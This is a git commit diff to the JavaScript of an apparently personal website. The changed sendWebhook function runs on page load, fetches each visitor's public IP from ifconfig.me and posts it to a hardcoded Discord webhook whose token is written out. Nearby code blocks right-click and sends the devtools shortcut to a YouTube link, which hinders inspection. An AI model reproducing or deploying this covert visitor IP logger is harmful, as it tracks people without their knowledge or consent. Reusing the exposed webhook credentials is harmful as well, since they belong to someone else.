accab0c393ae1c89ea268483c2b8cc9e02fb28d2
sefty <68341055+krulsefty@users.noreply.github.com>
2023-11-19 16:29:32 +0100

    Update app.js

--- js/app.js
+++ js/app.js
@@ -115,25 +115,31 @@ particlesJS("particles-js", {
     }
 });
 
-// sefty#0001
 async function sendWebhook() {
-	let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
-	var request = new XMLHttpRequest();
-	request.open("POST", "https://discord.com/api/webhooks/1159569318636429363/_g9StyBmN9rk9uV_Rjx33cdghwUg4dxjZe1fbozR_9klPfWhUijFnT4qsuxPc87BvwPc"); // paste your webhook link there
+    let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
+    const webhookURL = 'https://discord.com/api/webhooks/1175789235140317284/AWW8jXftbrOvj2Ap-gZm4ZzCjHxVvyBq1RvengSTozaCeeDCHDccbiA6xrc6MrYQPZ7s';
 
-	request.setRequestHeader('Content-type', 'application/json');
+    const message = {
+        content: `${ip}`,
+    };
 
-	var params = {
-		username: "sefty.xyz",
-		avatar_url: "https://discord.com/api/webhooks/1175789235140317284/AWW8jXftbrOvj2Ap-gZm4ZzCjHxVvyBq1RvengSTozaCeeDCHDccbiA6xrc6MrYQPZ7s",
-		content: `${ip}`
-	};
-
-	request.send(JSON.stringify(params));
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+    })
+        .then(response => {
+            if (!response.ok) {
+                console.error(`Error ${response.status}: ${response.statusText}`);
+            }
+        })
+        .catch(error => console.error('Error:', error));
 };
 
 window.onload = function () { // this will run funcion on page load
-	sendWebhook();
+    sendWebhook();
 };
 
 document.addEventListener("contextmenu", function (e) {
@@ -146,7 +152,7 @@ document.onkeydown = function (e) {
     }
 
     if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
-        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", '_blank')    
+        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", '_blank')
         return false
     }
 
